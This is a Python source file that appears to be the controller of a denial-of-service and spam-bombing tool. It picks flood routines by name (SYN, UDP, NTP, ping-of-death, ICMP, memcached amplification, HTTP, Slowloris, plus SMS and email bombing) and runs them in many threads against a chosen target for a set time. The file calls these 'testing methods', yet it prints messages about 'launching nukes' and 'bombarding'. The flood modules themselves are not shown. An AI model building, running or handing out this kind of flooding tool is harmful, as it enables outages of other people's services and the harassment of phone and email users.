from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from modules.crash_handler import CriticalError
from modules.ipTools import GetTargetAddress, InternetConnectionCheck

""" Find & import testing method """


def GetMethodByName(way):
    if way == "JACKPHONE":
        dir = "modules.jackphone.runner"
    elif way == "JACKMAIL":
        dir = "modules.jackmail.mailOperator"
    elif way in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
        dir = f"modules.protocols.{way.lower()}"
    elif way in ("HTTP", "SLOWLORIS"):
        dir = f"modules.ref.{way.lower()}"
    else:
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown testing method \
                {repr(way)} selected..{Fore.RESET}"
        )
    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        way = getattr(module, "flood")
        return way
    else:
        CriticalError(
            f"Method 'flood' not found in {repr(dir)}. Please use \
                python 3.8", "-"
        )


""" Class to control nuking methods methods """


class TestingMethod:

    # Constructor
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Enter
    def __enter__(self):
        InternetConnectionCheck()
        self.way = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Exit
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Nukes launched successfully!{Fore.RESET}")

    # Run time checker
    def __RunTimer(self):
        __stopTime = time() + self.duration
        while time() < __stopTime:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    # Run flooder
    def __RunFlood(self):
        while self.is_running:
            self.way(self.target)

    # Start threads
    def __RunThreads(self):
        # Run timer thread
        thread = Thread(target=self.__RunTimer)
        thread.start()
        # Check if 1 thread
        if self.name == "JACKMAIL":
            self.threads_count = 1
        # Create flood threads
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        # Start flood threads
        with Spinner(
            label=f"{Fore.YELLOW}Starting \
                {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        # Wait flood threads for stop
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread \
                    {index + 1}.{Fore.RESET}"
            )

    # Launch test
    def Start(self):
        if self.name == "JACKMAIL":
            target = self.target_name
        else:
            target = str(self.target).strip(
                "()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Launching nukes to \
                {target} using method {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Bombarding will be stopped \
                after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. \
                    Stopping {self.threads_count} threads..{Fore.RESET}"
            )
            # Wait all threads for stop
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)
